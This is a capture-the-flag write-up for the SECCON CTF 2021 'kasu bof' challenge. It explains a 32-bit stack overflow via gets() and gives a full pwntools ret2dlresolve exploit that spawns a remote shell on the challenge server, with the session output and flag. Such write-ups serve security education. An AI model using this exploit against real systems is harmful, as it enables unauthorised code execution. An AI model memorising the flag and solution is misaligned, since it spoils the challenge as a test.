# SECCON CTF 2021

## kasu bof

> 112
>
> Do you understand return-to-dl-resolve attack on 32-bit?
> 
> `nc hiyoko.quals.seccon.jp 9001`
>
> Author: ptr-yudai
> 
> [`kasu_bof.tar.gz`](kasu_bof.tar.gz)

Tags: _pwn_ _x86_ _bof_ _remote-shell_ _ret2dlresolve_


## Summary

LOL, this is the first time I read the challenge description, but yes, this an easy 32-bit _return-to-dl-resolve_ challenge.

> I'm not going to cover all the internals or details of ret2dlresolve (in this write up, I'm working on a future article), however here are two good reads:
>
> [https://syst3mfailure.io/ret2dl_resolve](https://syst3mfailure.io/ret2dl_resolve)  
> [https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62)
> 
> The challenge author also posted his [solution](solver.py) to the SECCON CTF 2021 Discord in #pwn.  I'm unaware of any external link, so I've included as part of this writeup.  This is a very good resource to follow if you want to understand how to roll-your-own.


## Analysis

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

At least three conditions must be met for _ret2dlresolve_, No PIE (or a base process leak), No canary (or a canary leak, or some other way to write down stack), and Partial RELRO.  We're all clear here.


### Decompile with Ghidra

```c
undefined4 main(void)
{
  char local_88 [128];
  undefined4 local_8;
  
  local_8 = 0;
  gets(local_88);
  return 0;
}
```

`gets` and the lack of mitigations above = easy shell with _ret2dlresolve_.

*Are there other methods?*

Perhaps, however there's not a lot to work with.  No leaks, and nothing else in the GOT.  IOW, we're blind, no output until we get a shell.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./kasu')

dl = Ret2dlresolvePayload(binary, symbol='system', args=['/bin/sh'])

rop = ROP(binary)
rop.gets(dl.data_addr,len(dl.payload))
rop.ret2dlresolve(dl)

if args.REMOTE:
    p = remote('hiyoko.quals.seccon.jp', 9001)
else:
    p = process(binary.path)

payload  = b''
payload += 0x88 * b'A'
payload += rop.chain()
payload += b'\n'
payload += dl.payload

p.sendline(payload)
p.interactive()
```

Almost straight from: [https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html).

All we needed to figure out is the `0x88` (end of the stack frame where the return address is), and we get this for free from Ghidra (.e.g `local_88`).


```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/seccon2021/kasu/kasu'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 11 cached gadgets for './kasu'
[+] Opening connection to hiyoko.quals.seccon.jp on port 9001: Done
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls -l
total 20
-r-xr-x--- 1 root pwn 15336 Dec  8 14:09 chall
-r--r----- 1 root pwn    36 Dec  8 14:09 flag-4f8e964cf95b989f6def1afdfd0e91b7.txt
$ cat flag*
SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}
```
